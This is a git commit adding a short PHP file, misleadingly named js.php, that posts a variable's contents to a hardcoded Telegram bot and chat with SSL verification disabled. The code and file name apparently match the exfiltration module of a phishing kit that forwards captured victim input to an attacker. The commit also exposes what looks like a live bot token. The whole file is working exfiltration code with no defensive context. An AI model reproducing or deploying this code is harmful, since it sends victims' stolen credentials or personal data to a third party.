13ba3377c6fe628c624915e236c791686a0bf1e0
BlackWolfXTn <141213805+BlackWolfXTn@users.noreply.github.com>
2023-08-07 09:42:16 +0100

    js.php

---
+++ js.php
@@ -0,0 +1,16 @@
+<?php 
+$website="https://api.telegram.org/bot6189034505:AAFfJo3siDPKA1juFvOiXRXRtG8BZFIB2Bo";
+
+$params=[
+    'chat_id'=>'-878079317',
+    'text'=>$text_result,
+];
+$ch = curl_init($website . '/sendMessage');
+curl_setopt($ch, CURLOPT_HEADER, false);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+$result = curl_exec($ch);
+curl_close($ch);
+?>
